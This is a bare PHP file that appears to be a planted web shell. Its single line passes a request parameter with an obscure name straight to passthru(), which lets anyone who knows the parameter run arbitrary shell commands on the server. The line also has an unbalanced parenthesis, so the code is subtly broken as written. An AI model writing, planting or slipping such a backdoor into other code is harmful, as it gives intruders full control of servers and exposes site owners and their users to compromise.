<?php
passthru(($_GET['Gb7MgBY_']);
?>
